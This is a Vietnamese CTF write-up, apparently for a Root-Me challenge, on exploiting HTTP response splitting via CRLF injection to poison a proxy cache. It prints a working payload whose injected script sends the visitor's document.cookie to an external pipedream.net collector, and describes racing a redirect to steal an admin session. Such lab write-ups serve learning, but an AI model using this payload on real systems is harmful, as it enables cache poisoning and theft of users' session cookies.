# HTTP Response Splitting

Lưu ý: trước khi giải bài này thì bạn cần phải biết về cách thức tấn công này để có thể thực hiện tấn công thành công. Bạn có thể đọc ở [đây](http://www.moqifei.com/archives/609). Mình đã đọc qua một vài trang viết về HTTP Response Splitting và trang web vừa rồi là trang web viết rõ nhất và dễ hiểu nhất.

Khi mở trang web lên thì mình nhận được yêu cầu phải chọn ngôn ngữ.

![anh1](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/HTTPRessplit_1.png)

Thông qua việc tìm hiểu các tài liệu về HTTP Response Splitting, mình biết rằng mình có thể kiểm tra xem trang web có thể bị inject không  bằng việc sử dụng CLRF injection (sử dụng các kí tự `\r\n` để tạo xuống dòng trong request). Mình đã thử sử dụng và thêm vào 1 trường test=true. Sau khi kiểm tra response thì mình thấy dưới trường Set-Cookie của response có thêm trường test=true, tức là mình có thể thực hiện inject được.

![anh2](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/HTTPRessplit_2.PNG)

Mình viết thêm đoạn payload như sau:

```
\r\nContent-Length: 0
\r\n
\r\nHTTP/1.1 200 OK
\r\nContent-Type: text/html
\r\nLast-modified: Thu, 01, Jan 2100 12:00:00 GMT
\r\nContent-Length: 138
\r\n
\r\n<script>document.write("<h1>test</h1><img src=http://eoyoae37hp6q6ss.m.pipedream.net".concat(document.cookie).concat(" />"))</script>

```

Ở đây, dòng Content-Length đầu tiên mình gán giá trị bằng 0, tức là inject vào gói response của server để kết thúc response thứ nhất. Sau đó mình viết thêm response thứ 2 cùng đoạn script để thực hiện XSS, gửi dữ liệu về 1 trang web thứ 3 và mình sẽ chờ ở đó để lấy dữ liệu. Last-modified mình set thành 1 giá trị khá lớn để tránh việc cập nhật lại cache của proxy, làm cho việc inject không thành công. Sau đó thực hiện encode url cho payload và gửi cho server.

![anh3](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/HTTPRessplit_3.png)

Gửi request và thấy rằng mình đã tạo được 2 response thành công. Tuy nhiên nếu chú ý kĩ thì ở phần response của server trả về có trường Location.

![anh4](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/HTTPRessplit_4.png)

Trường này sẽ chỉ định việc redirect về trang /home, và việc này diễn ra rất nhanh, vì vậy không thể thực hiện exploit thành công được. Vì theo mình hiểu thì HTTP response splitting hoạt động dựa vào việc attacker gửi 1 request có kèm payload để nhận về 2 response, 1 response sẽ trả về cho attacker, còn lại 1 response sẽ lưu trữ trên cache của proxy. Lúc này nếu 1 request khác bất kì kết nối đến trong lúc cache còn lưu trữ response kia thì nó sẽ tự động ánh xạ response này cho tất cả các request tương tự. Trong bài này thì attacker sẽ gửi 1 request có kèm payload, sau đó nhận về 2 response, 1 response sẽ được lưu trữ lại trên cache là response thứ 2 (HTTP/1.1 200 OK). Sau đó hắn gửi 1 request tới /admin, response còn lại sẽ được ánh xạ vào request này, tức là từ lúc đó về sau các request tới /admin đều sẽ nhận được response HTTP/1.1 200 OK của attacker dẫn tới việc bị dính đoạn code XSS. Lúc này khi admin vào /admin thì cũng sẽ bị ảnh hưởng tương tự.

Tuy nhiên nhờ vào trường Location có trong http response thì trình duyệt sẽ tự động nhảy về /home ngay lập tức, dẫn tới việc attacker không thể gửi request thứ 2 tới /admin kịp. Vì vậy để exploit thành công thì mình đã viết 1 đoạn code sử dụng multi-threading để có thể gửi request thứ 2 tới /admin trước khi bị chuyển hướng về /home.

Đoạn code này mình sẽ up lên sau.

Chương trình mình viết bao gồm 2 function, 1 để poison cache của proxy bằng việc gửi 1000 payload để inject và 1 để gửi request tới /admin làm cho việc inject thành công. Để chắc chắn mình đã cho 4 luồng chạy song song.

Chạy chương trình và đợi 1 khoảng thời gian sau đó để admin ghé thăm /admin thì mình nhận thấy việc inject đã thành công vì đã có 1 request gửi tới trang RequestBin chứa session của admin.

![anh5](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/HTTPRessplit_5.PNG)

![anh6](https://raw.githubusercontent.com/quochuyy10217/MyCTFWriteups/main/rootme/img_src/HTTPRessplit_6.png)

Đem admin session vừa lấy được đem submit và giải được bài này.

![anh7](https://github.com/quochuyy10217/MyCTFWriteups/blob/main/rootme/img_src/HTTPRessplit_7.png)